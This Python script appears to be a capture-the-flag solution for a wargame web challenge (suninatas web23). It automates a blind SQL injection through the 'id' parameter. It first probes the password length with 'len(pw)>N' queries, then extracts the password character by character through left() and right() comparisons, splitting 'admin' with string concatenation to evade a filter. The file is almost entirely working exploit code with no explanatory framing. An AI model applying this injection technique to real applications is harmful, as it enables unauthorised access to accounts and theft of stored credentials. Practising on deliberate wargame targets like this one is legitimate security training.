import requests

def request(uid):
	url = f'http://suninatas.com/challenge/web23/web23.asp?id={uid}&pw=1234'
	response = requests.get(url)
	return response

def find_len_pw():
	for num in range(3,30):
		uid = f'admi\'%2B\'n\' and len(pw)>{num}--'
		response = request(uid)
		if "False" in response.text:
			print("Finally I can get pw len: ",num)
			break
	return num

def solve(len_pw):

	# got first letter of pw
	#uid = f'admi\'%2B\'n\' and left(pw,1)=\''+chr(i)+'\'--' 
	#==> V
	res = "V"
	print(f"Wait! I find 1's letter : ",res)

	# get 9 letter on the left side
	for idx in range(2,len_pw+1):
		for i in range(33,127):
			uid = f'\'or left(pw,{idx})=\''+res+chr(i)+'\'--'
			response = request(uid)
			if "OK" in response.text:
				print(f"Wait! I find {idx}'s letter : ",chr(i))
				res += chr(i)
				break

	# get 2 letter on the right side
	res2 = ''
	for idx in range(1,3):
		for i in range(33,127):
			uid = f'\'or right(pw,{idx})=\''+chr(i)+res2+'\'--'
			response = request(uid)
			if "OK" in response.text:
				print(f"Wait! I find {idx}'s letter : ",chr(i))
				res2 = chr(i) + res2
				break

	print(res+res2)

if __name__ == "__main__":
	len_pw = find_len_pw()
	solve(len_pw)	
